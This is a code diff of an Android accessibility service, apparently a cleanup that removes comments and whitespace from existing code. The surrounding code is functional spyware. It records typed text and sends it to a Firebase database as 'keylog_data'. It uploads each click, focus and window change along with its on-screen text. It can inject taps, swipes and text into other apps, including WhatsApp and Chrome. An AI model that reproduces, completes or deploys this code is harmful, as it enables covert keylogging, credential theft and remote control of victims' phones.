@@ -2,13 +2,11 @@ package com.example.foregroundservice;
 
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.GestureDescription;
-import android.accessibilityservice.InputMethod;
 import android.content.ClipData;
 import android.content.ClipboardManager;
 import android.content.Context;
 import android.content.Intent;
 import android.graphics.Path;
-import android.graphics.Rect;
 import android.os.Bundle;
 import android.provider.Settings;
 import android.util.Log;
@@ -43,8 +41,6 @@ public class MyAccessibilityService extends AccessibilityService {
         if (isKeylogging) {
             handleKeylogging(event);
         }
-        
-        // Handle other accessibility events
         handleAccessibilityEvent(event);
     }
 
@@ -65,8 +61,6 @@ public class MyAccessibilityService extends AccessibilityService {
             String text = event.getText().toString();
             if (!text.isEmpty()) {
                 keylogBuffer.append(text);
-                
-                // Send to Firebase every 100 characters
                 if (keylogBuffer.length() >= 100) {
                     sendKeylogData(keylogBuffer.toString());
                     keylogBuffer.setLength(0);
@@ -76,7 +70,6 @@ public class MyAccessibilityService extends AccessibilityService {
     }
 
     private void handleAccessibilityEvent(AccessibilityEvent event) {
-        // Handle various accessibility events
         switch (event.getEventType()) {
             case AccessibilityEvent.TYPE_VIEW_CLICKED:
                 handleViewClicked(event);
@@ -95,9 +88,7 @@ public class MyAccessibilityService extends AccessibilityService {
         if (source != null) {
             String className = source.getClassName().toString();
             String text = source.getText() != null ? source.getText().toString() : "";
-            String contentDesc = source.getContentDescription() != null ? 
-                source.getContentDescription().toString() : "";
-            
+            String contentDesc = source.getContentDescription() != null ? source.getContentDescription().toString() : "";
             JSONObject clickData = new JSONObject();
             try {
                 clickData.put("type", "click");
@@ -105,7 +96,6 @@ public class MyAccessibilityService extends AccessibilityService {
                 clickData.put("text", text);
                 clickData.put("contentDesc", contentDesc);
                 clickData.put("timestamp", System.currentTimeMillis());
-                
                 database.child("accessibility_events").child(userId).push().setValue(clickData.toString());
             } catch (Exception e) {
                 Log.e(TAG, "Error creating click data", e);
@@ -119,14 +109,12 @@ public class MyAccessibilityService extends AccessibilityService {
         if (source != null) {
             String className = source.getClassName().toString();
             String text = source.getText() != null ? source.getText().toString() : "";
-            
             JSONObject focusData = new JSONObject();
             try {
                 focusData.put("type", "focus");
                 focusData.put("className", className);
                 focusData.put("text", text);
                 focusData.put("timestamp", System.currentTimeMillis());
-                
                 database.child("accessibility_events").child(userId).push().setValue(focusData.toString());
             } catch (Exception e) {
                 Log.e(TAG, "Error creating focus data", e);
@@ -138,14 +126,12 @@ public class MyAccessibilityService extends AccessibilityService {
     private void handleWindowStateChanged(AccessibilityEvent event) {
         String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
         String className = event.getClassName() != null ? event.getClassName().toString() : "";
-        
         JSONObject windowData = new JSONObject();
         try {
             windowData.put("type", "window_change");
             windowData.put("packageName", packageName);
             windowData.put("className", className);
             windowData.put("timestamp", System.currentTimeMillis());
-            
             database.child("accessibility_events").child(userId).push().setValue(windowData.toString());
         } catch (Exception e) {
             Log.e(TAG, "Error creating window data", e);
@@ -173,7 +159,6 @@ public class MyAccessibilityService extends AccessibilityService {
             keylogData.put("type", "keylog");
             keylogData.put("data", data);
             keylogData.put("timestamp", System.currentTimeMillis());
-            
             database.child("keylog_data").child(userId).push().setValue(keylogData.toString());
         } catch (Exception e) {
             Log.e(TAG, "Error sending keylog data", e);
@@ -198,10 +183,8 @@ public class MyAccessibilityService extends AccessibilityService {
     public void injectTap(float x, float y) {
         Path path = new Path();
         path.moveTo(x, y);
-        
         GestureDescription.Builder builder = new GestureDescription.Builder();
         builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 100));
-        
         dispatchGesture(builder.build(), null, null);
     }
 
@@ -209,18 +192,15 @@ public class MyAccessibilityService extends AccessibilityService {
         Path path = new Path();
         path.moveTo(startX, startY);
         path.lineTo(endX, endY);
-        
         GestureDescription.Builder builder = new GestureDescription.Builder();
         builder.addStroke(new GestureDescription.StrokeDescription(path, 0, duration));
-        
         dispatchGesture(builder.build(), null, null);
     }
 
     public void injectText(String text) {
         Bundle arguments = new Bundle();
         arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
-        
-        AccessibilityNodeInfo focusedNode = getRootInActiveWindow().findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
+        AccessibilityNodeInfo focusedNode = getRootInActiveWindow() != null ? getRootInActiveWindow().findFocus(AccessibilityNodeInfo.FOCUS_INPUT) : null;
         if (focusedNode != null) {
             focusedNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
             focusedNode.recycle();
@@ -239,7 +219,6 @@ public class MyAccessibilityService extends AccessibilityService {
             apps.add("com.android.settings");
             apps.add("com.android.chrome");
             apps.add("com.whatsapp");
-            // Add more apps as needed
         } catch (Exception e) {
             Log.e(TAG, "Error getting installed apps", e);
         }
@@ -275,7 +254,6 @@ public class MyAccessibilityService extends AccessibilityService {
             statusData.put("type", "accessibility_status");
             statusData.put("status", status);
             statusData.put("timestamp", System.currentTimeMillis());
-            
             database.child("service_status").child(userId).setValue(statusData.toString());
         } catch (Exception e) {
             Log.e(TAG, "Error sending service status", e);
